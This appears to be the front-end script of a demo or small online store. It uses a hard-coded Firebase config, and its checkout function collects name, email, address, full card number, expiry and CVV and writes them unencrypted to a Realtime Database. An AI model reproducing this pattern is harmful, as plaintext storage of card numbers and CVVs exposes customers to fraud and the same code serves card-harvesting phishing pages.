const firebaseConfig = {
  apiKey: "AIzaSyDut1Ldj7pmJkIjHYjsbfyQiewe7h2hVGk",
  authDomain: "store-d141b.firebaseapp.com",
  projectId: "store-d141b",
  databaseURL: "https://store-d141b-default-rtdb.firebaseio.com/",
  storageBucket: "store-d141b.appspot.com",
  messagingSenderId: "413975152509",
  appId: "1:413975152509:web:83e83a43f8709f132d2e14",
};

const app = firebase.initializeApp(firebaseConfig);
const dbRef = firebase.database().ref();

const detailsRef = dbRef.child("userdetails");
detailsRef.on("child_added", function (snapshot, prevChildKey) {
  var newPost = snapshot.val();
});

function send() {
  var fname = document.getElementById("fname").value;
  var email = document.getElementById("email").value;
  var adr = document.getElementById("adr").value;
  var city = document.getElementById("city").value;
  var state = document.getElementById("state").value;
  var zip = document.getElementById("zip").value;
  var cname = document.getElementById("cname").value;
  var ccnum = document.getElementById("ccnum").value;
  var expyear = document.getElementById("expyear").value;
  var cvv = document.getElementById("cvv").value;

  detailsRef.push().set({
    fname: fname,
    email: email,
    adr: adr,
    city: city,
    state: state,
    zip: zip,
    cname: cname,
    ccnum: ccnum,
    expyear: expyear,
    cvv: cvv,
  });
}
